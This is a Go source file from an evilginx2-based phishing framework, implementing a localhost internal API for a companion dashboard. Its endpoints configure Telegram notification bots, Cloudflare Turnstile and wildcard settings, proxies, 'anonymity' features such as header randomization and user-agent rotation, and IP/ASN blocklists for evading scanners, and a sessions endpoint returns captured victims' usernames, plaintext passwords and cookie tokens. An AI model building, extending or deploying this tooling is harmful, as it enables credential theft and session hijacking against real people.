package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// InternalAPI provides an HTTP-only API server for internal communication
// This server binds ONLY to localhost (127.0.0.1) and does not use TLS
// It's designed for EvilFeed and other local services to communicate with Evilginx
type InternalAPI struct {
	server  *http.Server
	router  *mux.Router
	cfg     *Config
	db      *database.Database
	port    int
	running bool
	mtx     sync.Mutex

	// Callback functions to interact with HttpProxy
	getTelegramConfig  func() *TelegramConfig
	setTelegramConfig  func(botToken, chatId string, enabled *bool) error
	getTurnstileConfig func() *TurnstileConfig
	setTurnstileConfig func(siteKey, secretKey string, enabled *bool) error
	getProxyConfig     func() *ProxyConfig
	setProxyConfig     func(cfg *ProxyConfig) error

	// Additional config callbacks
	getAnonymityConfig      func() *AnonymityConfigPersist
	setAnonymityConfig      func(enabled, headerRandomization, userAgentRotation *bool) error
	getCloudflareConfig     func() *CloudflareConfig
	setCloudflareConfig     func(apiToken string, wildcardEnabled *bool) error
	getRequestCheckerConfig func() *RequestCheckerConfig
	setRequestCheckerConfig func(cfg *RequestCheckerConfig) error
}

// Note: TelegramConfig, TurnstileConfig, and ProxyConfig types are defined in config.go

// NewInternalAPI creates a new internal API server
func NewInternalAPI(cfg *Config, db *database.Database, hp *HttpProxy) *InternalAPI {
	api := &InternalAPI{
		port:   cfg.GetInternalAPIPort(),
		cfg:    cfg,
		db:     db,
		router: mux.NewRouter(),
	}
	api.setupRoutes()
	return api
}

// SetTelegramCallbacks sets the callback functions for Telegram config
func (api *InternalAPI) SetTelegramCallbacks(
	getConfig func() *TelegramConfig,
	setConfig func(botToken, chatId string, enabled *bool) error,
) {
	api.getTelegramConfig = getConfig
	api.setTelegramConfig = setConfig
}

// SetTurnstileCallbacks sets the callback functions for Turnstile config
func (api *InternalAPI) SetTurnstileCallbacks(
	getConfig func() *TurnstileConfig,
	setConfig func(siteKey, secretKey string, enabled *bool) error,
) {
	api.getTurnstileConfig = getConfig
	api.setTurnstileConfig = setConfig
}

// SetProxyCallbacks sets the callback functions for Proxy config
func (api *InternalAPI) SetProxyCallbacks(
	getConfig func() *ProxyConfig,
	setConfig func(cfg *ProxyConfig) error,
) {
	api.getProxyConfig = getConfig
	api.setProxyConfig = setConfig
}

// SetAnonymityCallbacks sets the callback functions for Anonymity config
func (api *InternalAPI) SetAnonymityCallbacks(
	getConfig func() *AnonymityConfigPersist,
	setConfig func(enabled, headerRandomization, userAgentRotation *bool) error,
) {
	api.getAnonymityConfig = getConfig
	api.setAnonymityConfig = setConfig
}

// SetCloudflareCallbacks sets the callback functions for Cloudflare config
func (api *InternalAPI) SetCloudflareCallbacks(
	getConfig func() *CloudflareConfig,
	setConfig func(apiToken string, wildcardEnabled *bool) error,
) {
	api.getCloudflareConfig = getConfig
	api.setCloudflareConfig = setConfig
}

// SetRequestCheckerCallbacks sets the callback functions for RequestChecker (blocklist) config
func (api *InternalAPI) SetRequestCheckerCallbacks(
	getConfig func() *RequestCheckerConfig,
	setConfig func(cfg *RequestCheckerConfig) error,
) {
	api.getRequestCheckerConfig = getConfig
	api.setRequestCheckerConfig = setConfig
}

// setupRoutes configures all API endpoints
func (api *InternalAPI) setupRoutes() {
	// Health check
	api.router.HandleFunc("/_health", api.handleHealth).Methods("GET")

	// Telegram config
	api.router.HandleFunc("/_telegram/config", api.handleTelegramConfig).Methods("GET", "POST")

	// Turnstile config
	api.router.HandleFunc("/_turnstile/config", api.handleTurnstileConfig).Methods("GET", "POST")

	// Proxy config
	api.router.HandleFunc("/_proxy/config", api.handleProxyConfig).Methods("GET", "POST")

	// Anonymity config
	api.router.HandleFunc("/_anonymity/config", api.handleAnonymityConfig).Methods("GET", "POST")

	// Cloudflare config
	api.router.HandleFunc("/_cloudflare/config", api.handleCloudflareConfig).Methods("GET", "POST")

	// RequestChecker (blocklist) config
	api.router.HandleFunc("/_blocklist/config", api.handleBlocklistConfig).Methods("GET", "POST")

	// Sessions API
	api.router.HandleFunc("/_sessions", api.handleSessions).Methods("GET")

	// Catch-all for unknown endpoints
	api.router.PathPrefix("/").HandlerFunc(api.handleNotFound)
}

// Start starts the internal API server
func (api *InternalAPI) Start() error {
	api.mtx.Lock()
	defer api.mtx.Unlock()

	if api.running {
		return fmt.Errorf("internal API server already running")
	}

	// Bind ONLY to localhost for security
	addr := fmt.Sprintf("127.0.0.1:%d", api.port)

	api.server = &http.Server{
		Addr:         addr,
		Handler:      api.router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	// Create listener explicitly bound to localhost
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to bind internal API to %s: %v", addr, err)
	}

	go func() {
		log.Important("🔌 Internal API Server started on http://%s", addr)
		log.Info("   Endpoints: /_telegram/config, /_turnstile/config, /_proxy/config, /_sessions")
		if err := api.server.Serve(listener); err != nil && err != http.ErrServerClosed {
			log.Error("Internal API Server error: %v", err)
		}
	}()

	api.running = true
	return nil
}

// Stop stops the internal API server
func (api *InternalAPI) Stop() {
	api.mtx.Lock()
	defer api.mtx.Unlock()

	if api.server != nil && api.running {
		api.server.Close()
		api.running = false
		log.Info("Internal API Server stopped")
	}
}

// IsRunning returns whether the server is running
func (api *InternalAPI) IsRunning() bool {
	api.mtx.Lock()
	defer api.mtx.Unlock()
	return api.running
}

// GetPort returns the port the server is running on
func (api *InternalAPI) GetPort() int {
	return api.port
}

// --- HTTP Handlers ---

func (api *InternalAPI) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "ok",
		"service": "evilginx-internal-api",
		"port":    api.port,
	})
}

func (api *InternalAPI) handleTelegramConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getTelegramConfig == nil {
			// Fallback to config
			tcfg := api.cfg.GetTelegramConfig()
			json.NewEncoder(w).Encode(TelegramConfig{
				BotToken: tcfg.BotToken,
				ChatId:   tcfg.ChatId,
				Enabled:  tcfg.Enabled,
			})
			return
		}
		cfg := api.getTelegramConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			BotToken string `json:"bot_token"`
			ChatId   string `json:"chat_id"`
			Enabled  *bool  `json:"enabled"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setTelegramConfig != nil {
			if err := api.setTelegramConfig(req.BotToken, req.ChatId, req.Enabled); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.BotToken != "" {
				api.cfg.SetTelegramBotToken(req.BotToken)
			}
			if req.ChatId != "" {
				api.cfg.SetTelegramChatId(req.ChatId)
			}
			if req.Enabled != nil {
				api.cfg.SetTelegramEnabled(*req.Enabled)
			}
		}

		log.Info("internal-api: Telegram config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleTurnstileConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getTurnstileConfig == nil {
			// Fallback to config
			tcfg := api.cfg.GetTurnstileConfig()
			json.NewEncoder(w).Encode(TurnstileConfig{
				SiteKey:   tcfg.SiteKey,
				SecretKey: tcfg.SecretKey,
				Enabled:   tcfg.Enabled,
			})
			return
		}
		cfg := api.getTurnstileConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			SiteKey   string `json:"sitekey"`
			SecretKey string `json:"secretkey"`
			Enabled   *bool  `json:"enabled"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setTurnstileConfig != nil {
			if err := api.setTurnstileConfig(req.SiteKey, req.SecretKey, req.Enabled); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.SiteKey != "" {
				api.cfg.SetTurnstileSiteKey(req.SiteKey)
			}
			if req.SecretKey != "" {
				api.cfg.SetTurnstileSecretKey(req.SecretKey)
			}
			if req.Enabled != nil {
				api.cfg.SetTurnstileEnabled(*req.Enabled)
			}
		}

		log.Info("internal-api: Turnstile config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleProxyConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getProxyConfig == nil {
			// Fallback to config
			proxyType := api.cfg.proxyConfig.Type
			if proxyType == "" {
				proxyType = "socks5"
			}
			json.NewEncoder(w).Encode(ProxyConfig{
				Type:     proxyType,
				Address:  api.cfg.proxyConfig.Address,
				Port:     api.cfg.proxyConfig.Port,
				Username: api.cfg.proxyConfig.Username,
				Password: "", // Don't expose password
				Enabled:  api.cfg.proxyConfig.Enabled,
			})
			return
		}
		cfg := api.getProxyConfig()
		cfg.Password = "" // Don't expose password in GET
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req ProxyConfig
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setProxyConfig != nil {
			if err := api.setProxyConfig(&req); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.Type != "" {
				api.cfg.SetProxyType(req.Type)
			}
			if req.Address != "" {
				api.cfg.SetProxyAddress(req.Address)
			}
			if req.Port > 0 {
				api.cfg.SetProxyPort(req.Port)
			}
			if req.Username != "" {
				api.cfg.SetProxyUsername(req.Username)
			}
			if req.Password != "" {
				api.cfg.SetProxyPassword(req.Password)
			}
			api.cfg.EnableProxy(req.Enabled)
		}

		log.Info("internal-api: Proxy config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleSessions(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	// Get all sessions from database
	sessions, err := api.db.ListSessions()
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"failed to list sessions: %s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	// Convert to JSON-friendly format
	type SessionResponse struct {
		ID         int               `json:"id"`
		Phishlet   string            `json:"phishlet"`
		Username   string            `json:"username"`
		Password   string            `json:"password"`
		SessionID  string            `json:"session_id"`
		RemoteAddr string            `json:"remote_addr"`
		UserAgent  string            `json:"useragent"`
		Tokens     string            `json:"tokens"`
		Custom     map[string]string `json:"custom"`
		CreateTime int64             `json:"create_time"`
		UpdateTime int64             `json:"update_time"`
		LandingURL string            `json:"landing_url"`
	}

	var response []SessionResponse
	for _, s := range sessions {
		// Convert CookieTokens to JSON string
		tokensJSON := ""
		if len(s.CookieTokens) > 0 {
			if data, err := json.Marshal(s.CookieTokens); err == nil {
				tokensJSON = string(data)
			}
		}

		response = append(response, SessionResponse{
			ID:         s.Id,
			Phishlet:   s.Phishlet,
			Username:   s.Username,
			Password:   s.Password,
			SessionID:  s.SessionId,
			RemoteAddr: s.RemoteAddr,
			UserAgent:  s.UserAgent,
			Tokens:     tokensJSON,
			Custom:     s.Custom,
			CreateTime: s.CreateTime,
			UpdateTime: s.UpdateTime,
			LandingURL: s.LandingURL,
		})
	}

	json.NewEncoder(w).Encode(response)
}

func (api *InternalAPI) handleNotFound(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusNotFound)
	json.NewEncoder(w).Encode(map[string]string{
		"error": "endpoint not found",
		"path":  r.URL.Path,
		"hint":  "Available endpoints: /_health, /_telegram/config, /_turnstile/config, /_proxy/config, /_anonymity/config, /_cloudflare/config, /_blocklist/config, /_sessions",
	})
}

func (api *InternalAPI) handleAnonymityConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getAnonymityConfig == nil {
			// Fallback to config
			acfg := api.cfg.GetAnonymityConfig()
			json.NewEncoder(w).Encode(AnonymityConfigPersist{
				Enabled:             acfg.Enabled,
				HeaderRandomization: acfg.HeaderRandomization,
				UserAgentRotation:   acfg.UserAgentRotation,
			})
			return
		}
		cfg := api.getAnonymityConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			Enabled             *bool `json:"enabled"`
			HeaderRandomization *bool `json:"header_randomization"`
			UserAgentRotation   *bool `json:"useragent_rotation"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setAnonymityConfig != nil {
			if err := api.setAnonymityConfig(req.Enabled, req.HeaderRandomization, req.UserAgentRotation); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.Enabled != nil {
				api.cfg.SetAnonymityEnabled(*req.Enabled)
			}
			if req.HeaderRandomization != nil {
				api.cfg.SetAnonymityHeaderRandomization(*req.HeaderRandomization)
			}
			if req.UserAgentRotation != nil {
				api.cfg.SetAnonymityUserAgentRotation(*req.UserAgentRotation)
			}
		}

		log.Info("internal-api: Anonymity config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleCloudflareConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getCloudflareConfig == nil {
			// Fallback to config
			ccfg := api.cfg.GetCloudflareConfig()
			json.NewEncoder(w).Encode(CloudflareConfig{
				APIToken:        ccfg.APIToken,
				WildcardEnabled: ccfg.WildcardEnabled,
			})
			return
		}
		cfg := api.getCloudflareConfig()
		// Mask API token for security (show only last 4 chars)
		maskedToken := ""
		if cfg.APIToken != "" {
			if len(cfg.APIToken) > 4 {
				maskedToken = "****" + cfg.APIToken[len(cfg.APIToken)-4:]
			} else {
				maskedToken = "****"
			}
		}
		json.NewEncoder(w).Encode(map[string]interface{}{
			"api_token":        maskedToken,
			"wildcard_enabled": cfg.WildcardEnabled,
			"has_token":        cfg.APIToken != "",
		})
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			APIToken        string `json:"api_token"`
			WildcardEnabled *bool  `json:"wildcard_enabled"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setCloudflareConfig != nil {
			if err := api.setCloudflareConfig(req.APIToken, req.WildcardEnabled); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.APIToken != "" {
				api.cfg.SetCloudflareAPIToken(req.APIToken)
			}
			if req.WildcardEnabled != nil {
				api.cfg.SetCloudflareWildcardEnabled(*req.WildcardEnabled)
			}
		}

		log.Info("internal-api: Cloudflare config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}

func (api *InternalAPI) handleBlocklistConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method == "GET" {
		if api.getRequestCheckerConfig == nil {
			// Fallback to config
			rcfg := api.cfg.GetRequestCheckerConfig()
			json.NewEncoder(w).Encode(RequestCheckerConfig{
				Enabled:       rcfg.Enabled,
				ASNFile:       rcfg.ASNFile,
				UserAgentFile: rcfg.UserAgentFile,
				IPRangeFile:   rcfg.IPRangeFile,
				IPListFile:    rcfg.IPListFile,
				Verbose:       rcfg.Verbose,
			})
			return
		}
		cfg := api.getRequestCheckerConfig()
		json.NewEncoder(w).Encode(cfg)
		return
	}

	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"failed to read request"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req struct {
			Enabled       *bool  `json:"enabled"`
			ASNFile       string `json:"asn_file"`
			UserAgentFile string `json:"useragent_file"`
			IPRangeFile   string `json:"ip_range_file"`
			IPListFile    string `json:"ip_list_file"`
			Verbose       *bool  `json:"verbose"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error":"invalid JSON"}`, http.StatusBadRequest)
			return
		}

		// Update via callback or directly
		if api.setRequestCheckerConfig != nil {
			cfg := &RequestCheckerConfig{
				ASNFile:       req.ASNFile,
				UserAgentFile: req.UserAgentFile,
				IPRangeFile:   req.IPRangeFile,
				IPListFile:    req.IPListFile,
			}
			if req.Enabled != nil {
				cfg.Enabled = *req.Enabled
			}
			if req.Verbose != nil {
				cfg.Verbose = *req.Verbose
			}
			if err := api.setRequestCheckerConfig(cfg); err != nil {
				http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
				return
			}
		} else {
			// Direct config update
			if req.Enabled != nil {
				api.cfg.SetRequestCheckerEnabled(*req.Enabled)
			}
			if req.ASNFile != "" {
				api.cfg.SetRequestCheckerASNFile(req.ASNFile)
			}
			if req.UserAgentFile != "" {
				api.cfg.SetRequestCheckerUserAgentFile(req.UserAgentFile)
			}
			if req.IPRangeFile != "" {
				api.cfg.SetRequestCheckerIPRangeFile(req.IPRangeFile)
			}
			if req.IPListFile != "" {
				api.cfg.SetRequestCheckerIPListFile(req.IPListFile)
			}
			if req.Verbose != nil {
				api.cfg.SetRequestCheckerVerbose(*req.Verbose)
			}
		}

		log.Info("internal-api: Blocklist (RequestChecker) config updated")
		json.NewEncoder(w).Encode(map[string]bool{"success": true})
		return
	}

	http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
}
